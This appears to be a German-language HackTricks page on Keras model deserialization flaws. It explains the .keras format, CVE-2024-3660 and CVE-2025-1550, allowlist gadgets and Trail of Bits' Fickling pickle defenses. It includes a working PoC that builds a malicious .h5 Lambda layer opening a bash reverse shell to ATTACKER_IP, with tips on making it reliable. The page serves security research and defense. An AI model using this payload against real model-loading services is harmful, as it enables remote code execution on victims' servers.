# Keras Model Deserialization RCE und Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Diese Seite fasst praktische Exploitation-Techniken gegen die Keras-Modell-Deserialisierungspipeline zusammen, erklärt die Interna des nativen .keras-Formats und die Angriffsfläche und stellt ein Researcher-Toolkit zum Auffinden von Model File Vulnerabilities (MFVs) und post-fix gadgets bereit.

## .keras Modellformat-Interna

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens enthält:
- metadata.json – allgemeine Informationen (z. B. Keras-Version)
- config.json – Modellarchitektur (primäre Angriffsfläche)
- model.weights.h5 – Gewichte im HDF5-Format

Die config.json steuert die rekursive Deserialisierung: Keras importiert Module, löst Klassen/Funktionen auf und rekonstruiert Layers/Objekte aus vom Angreifer kontrollierten Dictionaries.

Beispielausschnitt für ein Dense-Layer-Objekt:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialisierung führt Folgendes aus:
- Import von Modulen und Auflösung von Symbolen aus module/class_name-Schlüsseln
- from_config(...) oder Konstruktoraufruf mit durch den Angreifer kontrollierten kwargs
- Rekursive Verarbeitung verschachtelter Objekte (activations, initializers, constraints, etc.)

Historisch hat das einem Angreifer, der config.json erstellt, drei Primitive offenbart:
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über die kwargs, die an Konstruktoren/from_config übergeben werden

## CVE-2024-3660 – Lambda-layer bytecode RCE

Ursache:
- Lambda.from_config() verwendete python_utils.func_load(...), welches Angreifer-Bytes base64-dekodiert und marshal.loads() aufruft; das Python-Unmarshalling kann Code ausführen.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Gegenmaßnahmen:
- Keras erzwingt standardmäßig safe_mode=True. Serialisierte Python-Funktionen in Lambda werden blockiert, es sei denn, ein Benutzer deaktiviert dies explizit mit safe_mode=False.

Hinweise:
- Legacy-Formate (ältere HDF5-Saves) oder ältere Codebasen erzwingen möglicherweise keine modernen Prüfungen, sodass „downgrade“-artige Angriffe weiterhin anwendbar sind, wenn Opfer ältere Loader verwenden.

## CVE-2025-1550 – Beliebiger Modulimport in Keras ≤ 3.8

Ursache:
- _retrieve_class_or_fn verwendete uneingeschränkt importlib.import_module() mit vom Angreifer kontrollierten Modul-Strings aus config.json.
- Auswirkung: Beliebiger Import eines installierten Moduls (oder eines vom Angreifer auf sys.path abgelegten Moduls). Code zur Importzeit wird ausgeführt, danach erfolgt die Objekterstellung mit Angreifer-kwargs.

Exploit-Idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sicherheitsverbesserungen (Keras ≥ 3.9):
- Modul-Allowlist: Importe auf offizielle Module des Ökosystems beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Safe mode standardmäßig: safe_mode=True verhindert das Laden unsicherer, serialisierter Lambda-Funktionen
- Einfache Typprüfung: deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Viele Produktions-Stacks akzeptieren weiterhin legacy TensorFlow-Keras HDF5 Modelldateien (.h5). Wenn ein Angreifer ein Modell hochladen kann, das der Server später lädt oder für Inference verwendet, kann eine Lambda-Schicht beliebiges Python beim load/build/predict ausführen.

Minimaler PoC, um eine bösartige .h5 zu erstellen, die beim Deserialisieren oder Verwenden eine reverse shell ausführt:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Hinweise und Tipps zur Zuverlässigkeit:
- Auslösepunkte: Code kann mehrfach ausgeführt werden (z. B. während layer build/first call, model.load_model und predict/fit). Machen Sie payloads idempotent.
- Version-Pinning: Stimmen Sie die TF/Keras/Python-Version des Opfers ab, um Serialisierungsinkompatibilitäten zu vermeiden. Zum Beispiel: bauen Sie Artefakte unter Python 3.8 mit TensorFlow 2.13.1, wenn das Ziel diese Version verwendet.
- Schnelle Replikation der Umgebung:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validierung: Eine harmlose Nutzlast wie os.system("ping -c 1 YOUR_IP") hilft, die Ausführung zu bestätigen (z. B. ICMP mit tcpdump beobachten), bevor auf eine reverse shell umgeschaltet wird.

## Post-fix-gadget-Angriffsfläche innerhalb der allowlist

Selbst mit allowlisting und safe mode bleibt eine breite Angriffsfläche unter den erlaubten Keras callables. Zum Beispiel kann keras.utils.get_file beliebige URLs in vom Benutzer wählbare Speicherorte herunterladen.

Gadget via Lambda, das eine erlaubte Funktion referenziert (nicht serialisierter Python-Bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Wichtige Einschränkung:
- Lambda.call() fügt den Eingabe-Tensor als erstes Positionsargument hinzu, wenn das Ziel-callable aufgerufen wird. Ausgewählte gadgets müssen ein zusätzliches Positionsargument tolerieren (oder *args/**kwargs akzeptieren). Das schränkt ein, welche Funktionen brauchbar sind.

## ML-pickle-Import-Allowlist für AI/ML-Modelle (Fickling)

Viele AI/ML-Modellformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ältere TensorFlow-Artefakte, etc.) betten Python pickle-Daten ein. Angreifer missbrauchen routinemäßig pickle GLOBAL-Imports und Objektkonstruktoren, um RCE oder Modelltausch beim Laden zu erreichen. Blacklist-basierte Scanner übersehen oft neue oder nicht aufgelistete gefährliche Imports.

Eine praktikable Fail-Closed-Verteidigung besteht darin, Pythons pickle-Deserializer zu hooken und während des Unpicklings nur eine geprüfte Menge harmloser, ML-bezogener Imports zu erlauben. Trail of Bits’ Fickling implementiert diese Richtlinie und liefert eine kuratierte ML-Import-Allowlist, die aus tausenden öffentlichen Hugging Face pickles erstellt wurde.

Sicherheitsmodell für „sichere“ Imports (Intuitionen, destilliert aus Forschung und Praxis):
- Kein Ausführen von Code oder Verursachen von Ausführung (keine kompilierten/Quell-Code-Objekte, Shell-Aufrufe, hooks, etc.)
- Keine beliebigen Attribute oder Items lesen/setzen
- Keine Imports oder Beschaffung von Referenzen zu anderen Python-Objekten aus der pickle-VM
- Keine Auslösung sekundärer Deserialisierer (z. B. marshal, nested pickle), auch nicht indirekt

Aktivieren Sie Ficklings Schutzmechanismen möglichst früh beim Prozessstart, damit alle pickle loads, die von Frameworks (torch.load, joblib.load, etc.) durchgeführt werden, überprüft werden:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Betriebliche Hinweise:
- Sie können die hooks bei Bedarf vorübergehend deaktivieren/wieder aktivieren:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Wenn ein als vertrauenswürdig bekanntes Modell blockiert ist, erweitern Sie die allowlist für Ihre Umgebung, nachdem Sie die Symbole überprüft haben:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stellt außerdem generische Runtime-Guards bereit, wenn Sie feinere Kontrolle bevorzugen:
- fickling.always_check_safety() um Checks für alle pickle.load() durchzusetzen
- with fickling.check_safety(): für scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) für einmalige Checks

- Bevorzugen Sie nach Möglichkeit non-pickle model formats (z. B. SafeTensors). Wenn Sie pickle akzeptieren müssen, führen Sie Loader unter least privilege ohne network egress aus und erzwingen Sie die allowlist.

Diese allowlist-first strategy blockiert nachweislich gängige ML pickle-Exploit-Pfade und bewahrt dabei hohe Kompatibilität. In ToB’s benchmark markierte Fickling 100% der synthetischen bösartigen Dateien und erlaubte ~99% der sauberen Dateien aus den Top Hugging Face repos.


## Toolkit für Forscher

1) Systematische Gadget-Erkennung in allowlisted Modulen

Enumeriere candidate callables in keras, keras_nlp, keras_cv, keras_hub und priorisiere diejenigen mit file/network/process/env side effects.

<details>
<summary>Auflisten potenziell gefährlicher callables in allowlisted Keras-Modulen</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte Deserialisierungstests (kein .keras-Archiv benötigt)

Füttern Sie gezielt gestaltete dicts direkt in Keras-Deserialisierer, um akzeptierte Parameter kennenzulernen und Nebeneffekte zu beobachten.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing und Formate

Keras existiert in mehreren Codebasen/Epochen mit unterschiedlichen Schutzvorkehrungen und Formaten:
- TensorFlow built-in Keras: tensorflow/python/keras (veraltet, zur Löschung vorgesehen)
- tf-keras: wird separat gepflegt
- Multi-backend Keras 3 (offiziell): führte native .keras ein

Führe Tests über die verschiedenen Codebasen und Formate hinweg (.keras vs legacy HDF5) erneut durch, um Regressionen oder fehlende Schutzmaßnahmen aufzudecken.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
